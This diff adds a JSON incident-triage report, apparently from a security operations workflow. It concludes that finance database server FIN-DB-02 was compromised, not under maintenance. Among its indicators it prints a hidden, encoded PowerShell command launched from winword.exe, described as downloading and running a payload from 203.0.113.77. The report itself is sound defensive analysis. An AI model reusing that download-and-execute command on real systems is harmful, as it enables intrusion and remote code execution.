@@ -1,0 +1,132 @@
+{
+  "verdict": "True Positive",
+  "severity": "Critical",
+  "impact": "High",
+  "priority": "Critical",
+  "confidence": "High",
+  "digest": "Initial assessment of 'routine maintenance' was incorrect. Evidence indicates a malicious PowerShell execution on FIN-DB-02, likely initiated by winword.exe, which downloaded and executed a payload from an external IP (203.0.113.77). Subsequent persistent outbound connections to this IP suggest Command and Control activity. The maintenance team confirmed no authorized activity on the host. This is a critical compromise requiring immediate action.",
+  "affected_assets": [
+    {
+      "asset_type": "hostname",
+      "asset_value": "FIN-DB-02"
+    },
+    {
+      "asset_type": "ip_address",
+      "asset_value": "10.20.8.42"
+    }
+  ],
+  "evidence_findings": [
+    {
+      "title": "Malicious PowerShell Execution on FIN-DB-02",
+      "finding_type": "Malicious Activity",
+      "subject": "FIN-DB-02",
+      "evidence": "A hidden PowerShell process ('powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA') was executed, parented by 'winword.exe'. The decoded command invokes Net.WebClient to download and execute 'hxxps://203.0.113.77/update.dat'.",
+      "conclusion": "Unauthorized and malicious code execution occurred on the database server FIN-DB-02, indicating a compromise."
+    },
+    {
+      "title": "Unauthorized Outbound Network Connection to Malicious IP",
+      "finding_type": "Network Anomaly",
+      "subject": "10.20.8.42",
+      "evidence": "Persistent outbound connections from 10.20.8.42 (FIN-DB-02) to 203.0.113.77 on port 443 were observed immediately after the PowerShell execution. The destination IP is not on the corporate allowlist.",
+      "conclusion": "The network connections are indicative of Command and Control (C2) communication or data exfiltration to an external malicious entity."
+    },
+    {
+      "title": "Activity Not Associated with Approved Maintenance",
+      "finding_type": "Operational Discrepancy",
+      "subject": "FIN-DB-02",
+      "evidence": "The maintenance team confirmed they performed no work on FIN-DB-02, and no approved change references the observed PowerShell command or the destination IP 203.0.113.77.",
+      "conclusion": "The observed activity is unauthorized and not part of any legitimate maintenance, contradicting the initial case classification."
+    }
+  ],
+  "attack_chain": [
+    {
+      "attack_stage": "Initial Access",
+      "description": "Malicious activity initiated via 'winword.exe' launching a hidden PowerShell process."
+    },
+    {
+      "attack_stage": "Execution",
+      "description": "Encoded PowerShell script executed on FIN-DB-02 to download and execute a payload."
+    },
+    {
+      "attack_stage": "Command and Control",
+      "description": "Payload downloaded from 'hxxps://203.0.113.77/update.dat' and persistent outbound connections established to '203.0.113.77:443'."
+    }
+  ],
+  "attack_timeline": [
+    {
+      "timestamp": "2026-08-15T02:11:00Z",
+      "attack_behavior": "Malicious PowerShell execution detected on FIN-DB-02, parented by winword.exe.",
+      "evidence_field": "source_data.child_containers[0].artifacts[0]"
+    },
+    {
+      "timestamp": "2026-08-15T02:11:00Z",
+      "attack_behavior": "Outbound connections to 203.0.113.77:443 detected from 10.20.8.42 (FIN-DB-02).",
+      "evidence_field": "source_data.child_containers[1].artifacts[0]"
+    }
+  ],
+  "ioc_indicators": [
+    {
+      "indicator_type": "ip_address",
+      "value": "203.0.113.77",
+      "context": "Malicious Command and Control (C2) server."
+    },
+    {
+      "indicator_type": "url",
+      "value": "hxxps://203.0.113.77/update.dat",
+      "context": "URL for payload download."
+    },
+    {
+      "indicator_type": "process_command_line",
+      "value": "powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
+      "context": "Encoded malicious PowerShell command."
+    },
+    {
+      "indicator_type": "hostname",
+      "value": "FIN-DB-02",
+      "context": "Compromised database server."
+    },
+    {
+      "indicator_type": "ip_address",
+      "value": "10.20.8.42",
+      "context": "Internal IP address of the compromised host FIN-DB-02."
+    },
+    {
+      "indicator_type": "process_name",
+      "value": "winword.exe",
+      "context": "Parent process of the malicious PowerShell, suggesting initial access vector."
+    }
+  ],
+  "remediations": [
+    {
+      "action_type": "Containment",
+      "description": "Immediately isolate FIN-DB-02 from the network to prevent further compromise or lateral movement.",
+      "priority": "Critical"
+    },
+    {
+      "action_type": "Eradication",
+      "description": "Conduct a thorough forensic analysis of FIN-DB-02 to identify and remove all malicious artifacts, including the downloaded payload and any persistence mechanisms.",
+      "priority": "Critical"
+    },
+    {
+      "action_type": "Network Blocking",
+      "description": "Block all traffic to and from IP address 203.0.113.77 at the perimeter firewall and internal network controls.",
+      "priority": "High"
+    },
+    {
+      "action_type": "Threat Hunting",
+      "description": "Search for similar PowerShell execution patterns, network connections to 203.0.113.77, or 'winword.exe' spawning PowerShell across the environment.",
+      "priority": "High"
+    },
+    {
+      "action_type": "Process Review",
+      "description": "Review and update incident response and change management procedures to prevent misclassification of critical security alerts as benign maintenance.",
+      "priority": "Medium"
+    }
+  ],
+  "unknowns": [
+    "The exact initial infection vector that led to 'winword.exe' launching the malicious PowerShell process.",
+    "The specific functionality and capabilities of the 'update.dat' payload downloaded from 203.0.113.77.",
+    "The full scope of compromise on FIN-DB-02, including data exfiltration or further system modifications.",
+    "Whether other systems within the environment have been similarly compromised or targeted."
+  ]
+}
